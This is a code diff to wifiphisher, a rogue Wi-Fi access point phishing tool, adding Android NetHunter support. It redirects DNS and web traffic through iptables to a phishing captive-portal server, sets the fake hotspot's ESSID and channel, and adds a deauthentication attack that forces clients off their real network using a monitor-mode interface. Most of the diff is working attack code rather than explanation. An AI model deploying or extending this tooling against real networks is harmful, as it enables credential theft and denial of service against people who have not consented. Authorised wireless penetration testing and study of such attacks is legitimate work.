@@ -17,6 +17,7 @@ import curses
 import socket
 import struct
 import signal
+import re
 from threading import Thread
 from subprocess import Popen, PIPE, check_output
 from shutil import copyfile
@@ -34,6 +35,46 @@ import wifiphisher.common.tui as tui
 import wifiphisher.common.opmode as opmode
 
 logger = logging.getLogger(__name__)
+
+# Global references for signal handler cleanup
+_cleanup_iface = None
+_cleanup_port = None
+
+def _emergency_cleanup(signum=None, frame=None):
+    """
+    Emergency cleanup — removes iptables rules that would break
+    Android hotspot if left behind after crash/SIGTERM.
+    """
+    global _cleanup_iface, _cleanup_port
+    iface = _cleanup_iface
+    port = _cleanup_port
+    if iface and port:
+        for proto in ['udp', 'tcp']:
+            subprocess.call(
+                'iptables -t nat -D PREROUTING -i %s -p %s --dport 53 '
+                '-j REDIRECT --to-port %d 2>/dev/null' % (iface, proto, port),
+                shell=True)
+        subprocess.call(
+            'iptables -t nat -D PREROUTING -i %s -p tcp --dport 80 '
+            '-j DNAT 2>/dev/null' % iface, shell=True)
+        subprocess.call(
+            'iptables -t nat -D PREROUTING -i %s -p tcp --dport 443 '
+            '-j DNAT 2>/dev/null' % iface, shell=True)
+    elif iface:
+        # Port unknown — flush all PREROUTING
+        for _ in range(5):
+            ret = subprocess.call(
+                'iptables -t nat -D PREROUTING -i %s -p udp --dport 53 '
+                '-j REDIRECT 2>/dev/null' % iface, shell=True)
+            if ret != 0:
+                break
+    subprocess.call("pkill -f 'dnsmasq.*dhcpd.conf' 2>/dev/null", shell=True)
+    if signum is not None:
+        sys.exit(1)
+
+signal.signal(signal.SIGTERM, _emergency_cleanup)
+import atexit
+atexit.register(_emergency_cleanup)
 
 # Fixes UnicodeDecodeError for ESSIDs
 try:
@@ -209,7 +250,7 @@ class WifiphisherEngine:
     def __init__(self):
         self.mac_matcher = macmatcher.MACMatcher(MAC_PREFIX_FILE)
         self.network_manager = interfaces.NetworkManager()
-        self.template_manager = phishingpage.TemplateManager()
+        self.template_manager = None  # Created later in start() or _start_nethunter()
         self.access_point = accesspoint.AccessPoint()
         self.fw = firewall.Fw()
         self.em = extensions.ExtensionManager(self.network_manager)
@@ -228,7 +269,8 @@ class WifiphisherEngine:
         self.em.on_exit()
         self.access_point.on_exit()
         self.network_manager.on_exit()
-        self.template_manager.on_exit()
+        if self.template_manager:
+            self.template_manager.on_exit()
         self.fw.on_exit()
 
         if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
@@ -543,17 +585,26 @@ class WifiphisherEngine:
         No hostapd, no roguehostapd, no pyric interface detection.
         Requires: Android Hotspot already ON.
         """
-        print("\n" + "=" * 60)
-        print("[" + C + "*" + W + "] NetHunter mode — using Android native hotspot")
+        print()
+        print("=" * 60)
+        print("[" + C + "*" + W + "] NetHunter mode \u2014 using Android native hotspot")
         print("=" * 60)
 
         # Root check
         if os.geteuid():
             sys.exit('[' + R + '-' + W + '] Please run as root')
 
-        # Force noextensions (no monitor mode on NetHunter)
-        args.noextensions = True
         args.no_mac_randomization = True
+
+        # Deauth support: if user specified -eI, enable extensions
+        nethunter_extensions = False
+        mon_iface = None
+        if hasattr(args, 'extensionsinterface') and args.extensionsinterface:
+            mon_iface = args.extensionsinterface
+            nethunter_extensions = True
+            print("[" + G + "+" + W + "] Deauth interface: " + C + mon_iface + W)
+        else:
+            print("[ ] Deauth disabled (use " + C + "-eI wlan1" + W + " to enable)")
 
         # Enable NetHunter mode on all subsystems
         self.network_manager.enable_nethunter_mode()
@@ -566,14 +617,17 @@ class WifiphisherEngine:
             hotspot_ip=args.hotspot_ip
         )
         if not hotspot_ok:
-            print("\n[" + R + "!" + W + "] Android hotspot not detected!")
+            print()
+            print("[" + R + "!" + W + "] Android hotspot not detected!")
             print("[" + R + "!" + W + "] Turn ON hotspot in Android Settings, then retry.")
-            print("[" + R + "!" + W + "] Or specify: --hotspot-iface wlan2 --hotspot-ip 192.168.43.1\n")
+            print("[" + R + "!" + W + "] Or specify: " + C +
+                  "--hotspot-iface wlan2 --hotspot-ip 192.168.43.1" + W)
             # Show current interfaces for debugging
             try:
                 output = subprocess.check_output(
                     ['ip', '-4', 'addr', 'show'], stderr=subprocess.PIPE
                 ).decode('utf-8', errors='replace')
+                print()
                 print("[" + T + "*" + W + "] Current interfaces:")
                 for line in output.splitlines():
                     if 'inet ' in line or ': <' in line:
@@ -583,36 +637,77 @@ class WifiphisherEngine:
             sys.exit(1)
 
         ap_iface = self.access_point.interface
-        gw_ip = constants.NETWORK_GW_IP  # Read via module ref (updated by enable_nethunter_mode)
+        gw_ip = constants.NETWORK_GW_IP
 
-        print("[" + G + "+" + W + "] Hotspot interface: " + G + ap_iface + W)
-        print("[" + G + "+" + W + "] Gateway IP: " + G + gw_ip + W)
+        # ---- Interface mismatch warning ----
+        mismatch = self.access_point.get_iface_mismatch()
+        if mismatch:
+            req_iface, det_iface = mismatch
+            print()
+            print("[" + O + "\u26a0" + W + "] WARNING: " + C + "--hotspot-iface " +
+                  req_iface + W + " has no active hotspot!")
+            print("[" + O + "\u26a0" + W + "] Detected active hotspot on " +
+                  C + det_iface + W + " instead")
+            print("[" + O + "\u26a0" + W + "] Make sure the Android hotspot is ON " +
+                  "before starting wifiphisher")
+            print("[" + O + "\u26a0" + W + "] Press " + C + "Ctrl+C" + W +
+                  " to abort, or wait 5s to continue with " + C + det_iface + W + "...")
+            try:
+                for i in range(5, 0, -1):
+                    sys.stdout.write("\r[" + O + "\u26a0" + W +
+                                     "] Continuing in %ds...  " % i)
+                    sys.stdout.flush()
+                    time.sleep(1)
+                sys.stdout.write("\r" + " " * 40 + "\r")
+                sys.stdout.flush()
+            except KeyboardInterrupt:
+                print("\n[" + R + "!" + W + "] Aborted by user")
+                sys.exit(1)
 
-        # Setup iptables
-        self.fw.redirect_requests_localhost()
+        print("[" + G + "+" + W + "] Hotspot interface: " + C + ap_iface + W)
+        print("[" + G + "+" + W + "] Gateway IP: " + C + gw_ip + W)
+
+        # Setup iptables — DON'T call fw.redirect_requests_localhost() here!
+        # In NetHunter mode, accesspoint.start_dhcp_dns() sets up ALL rules:
+        #   DNS REDIRECT → our wildcard dnsmasq
+        #   HTTP DNAT → tornado :8080
+        #   HTTPS DNAT → tornado :443
+        # Calling fw.redirect_requests_localhost() would add DNAT DNS→:53
+        # which sends DNS to Android's dnsmasq (real DNS) BEFORE our REDIRECT
+        # → no wildcard → no captive portal!
         set_ip_fwd()
         set_route_localnet()
         print('[' + T + '*' + W + '] iptables configured')
 
-        # Get ESSID
+        # Auto-detect ESSID and channel from hotspot interface
+        essid = None
+        channel = None
+        try:
+            iw_output = subprocess.check_output(
+                ['iw', 'dev', ap_iface, 'info'], stderr=subprocess.PIPE
+            ).decode('utf-8', errors='replace')
+            m_ssid = re.search(r'^\s*ssid\s+(.+)$', iw_output, re.MULTILINE)
+            if m_ssid:
+                essid = m_ssid.group(1).strip()
+            m_ch = re.search(r'channel\s+(\d+)\s', iw_output)
+            if m_ch:
+                channel = m_ch.group(1)
+        except (subprocess.CalledProcessError, OSError):
+            pass
+
+        # Override with -e if specified
         if args.essid:
             essid = args.essid
-        else:
-            # Try to read SSID from hotspot interface
-            essid = "Android_Hotspot"
-            try:
-                output = subprocess.check_output(
-                    ['iwconfig', ap_iface], stderr=subprocess.PIPE
-                ).decode('utf-8', errors='replace')
-                import re
-                m = re.search(r'ESSID:"([^"]+)"', output)
-                if m:
-                    essid = m.group(1)
-            except (subprocess.CalledProcessError, OSError):
-                pass
-            print("[" + G + "+" + W + "] ESSID: " + G + essid + W)
 
-        channel = str(CHANNEL)
+        # Fallbacks
+        if not essid:
+            essid = self.access_point.get_android_ssid() or "Android_Hotspot"
+        if not channel:
+            channel = str(CHANNEL)
+
+        print("[" + G + "+" + W + "] ESSID: " + C + essid + W)
+        print("[" + G + "+" + W + "] Channel: " + C + channel + W)
+
         target_ap_mac = None
         enctype = None
 
@@ -623,7 +718,7 @@ class WifiphisherEngine:
                                                 self.template_manager)
         logger.info("Selecting {} template".format(template.get_display_name()))
         print("[" + G + "+" + W + "] Selecting " +
-              template.get_display_name() + " template")
+              C + template.get_display_name() + W + " template")
 
         # Payload
         if template.has_payload():
@@ -659,21 +754,90 @@ class WifiphisherEngine:
         try:
             self.access_point.set_essid(essid)
             self.access_point.set_channel(channel)
-            self.access_point.start()          # No-op in NetHunter mode
-            self.access_point.start_dhcp_dns() # Replaces Android dnsmasq
+            self.access_point.start()          # Kernel tweaks + SSID change
+            self.access_point.start_dhcp_dns() # DNS wildcard + ALL iptables
+            # Register for emergency cleanup
+            global _cleanup_iface, _cleanup_port
+            _cleanup_iface = ap_iface
+            _cleanup_port = self.access_point._dns_port
         except BaseException as e:
             print("[" + R + "!" + W + "] AP setup failed: " + str(e))
+            import traceback
+            traceback.print_exc()
             self.stop()
 
         # Start HTTP server
         print('[' + T + '*' + W + '] Starting HTTP/HTTPS server at ports ' +
-              str(PORT) + ", " + str(SSL_PORT))
+              C + str(PORT) + W + ", " + C + str(SSL_PORT) + W)
         webserver = Thread(
             target=phishinghttp.runHTTPServer,
             args=(gw_ip, PORT, SSL_PORT, template, self.em))
         webserver.daemon = True
         webserver.start()
         time.sleep(1.5)
+
+        # ---- Start extensions (deauth) if enabled ----
+        if nethunter_extensions and mon_iface:
+            print("[" + T + "*" + W + "] Starting deauth on " + C + mon_iface + W + "...")
+            try:
+                # Put monitor interface in monitor mode
+                subprocess.call(['ip', 'link', 'set', mon_iface, 'down'],
+                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                subprocess.call(['iw', 'dev', mon_iface, 'set', 'type', 'monitor'],
+                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                subprocess.call(['ip', 'link', 'set', mon_iface, 'up'],
+                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+                # Set channel on monitor iface to match target
+                target_ch = channel or str(constants.CHANNEL)
+                subprocess.call(
+                    ['iw', 'dev', mon_iface, 'set', 'channel', target_ch],
+                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                print("[" + G + "+" + W + "] " + C + mon_iface +
+                      W + " in monitor mode (ch " + C + target_ch + W + ")")
+
+                # Ensure args has all attributes deauth.py expects
+                if not hasattr(args, 'deauth_essid'):
+                    args.deauth_essid = None
+                if not hasattr(args, 'deauth_channels'):
+                    args.deauth_channels = []
+                if not hasattr(args, 'channel_monitor'):
+                    args.channel_monitor = False
+
+                # NetworkManager shim — ExtensionManager needs an object
+                # with set_interface_channel(). On NetHunter we use iw directly.
+                class _NMShim(object):
+                    def set_interface_channel(self, iface, ch):
+                        subprocess.call(
+                            ['iw', 'dev', iface, 'set', 'channel', str(ch)],
+                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+                # ExtensionManager init sequence (must be in this order):
+                # 1. Create EM with NetworkManager (or shim)
+                self.em = extensions.ExtensionManager(_NMShim())
+                # 2. Set monitor interface → opens L2Socket for scapy
+                self.em.set_interface(mon_iface)
+                # 3. Register which extensions to load
+                self.em.set_extensions(['deauth'])
+                # 4. Init extensions with shared_data dict
+                #    (converted to namedtuple internally by EM)
+                shared_data = {
+                    'is_freq_hop_allowed': False,
+                    'target_ap_channel': target_ch,
+                    'target_ap_essid': essid,
+                    'target_ap_bssid': target_ap_mac or "",
+                    'rogue_ap_mac': rogue_ap_mac or "00:00:00:00:00:00",
+                    'ap_channel': target_ch,
+                    'args': args,
+                }
+                self.em.init_extensions(shared_data)
+                # 5. Start listen + send threads
+                self.em.start_extensions()
+                print("[" + G + "+" + W + "] Deauth active \u2014 extensions feed updating")
+            except Exception as e:
+                print("[" + R + "!" + W + "] Deauth setup failed: " + str(e))
+                import traceback
+                traceback.print_exc()
 
         self.mac_matcher.unbind()
 
